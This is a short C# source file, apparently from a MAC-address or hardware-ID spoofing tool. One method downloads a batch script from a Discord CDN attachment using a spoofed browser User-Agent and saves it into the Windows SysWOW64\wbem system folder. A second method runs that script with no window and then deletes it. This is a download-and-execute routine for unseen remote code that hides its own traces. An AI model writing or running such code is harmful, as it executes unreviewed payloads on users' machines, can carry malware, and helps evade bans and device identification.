using System;
using System.Diagnostics;
using System.IO;
using System.Net;

namespace HardDrive
{
	internal class NtwSpoof
	{
		public static void Mac()
		{
			Process process = new Process();
			process.StartInfo.RedirectStandardInput = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.FileName = "C:\\Windows\\SysWOW64\\wbem\\Mac.Oblivion.bat";
			process.Start();
			process.WaitForExit();
			File.Delete("C:\\Windows\\SysWOW64\\wbem\\Mac.Oblivion.bat");
		}

		public static void MacDownload()
		{
			WebClient webClient = new WebClient();
			webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/614402516381204485/616995965781540878/Mac.Oblivion.bat", "C:\\Windows\\SysWOW64\\wbem\\Mac.Oblivion.bat");
			webClient.Proxy = null;
		}
	}
}
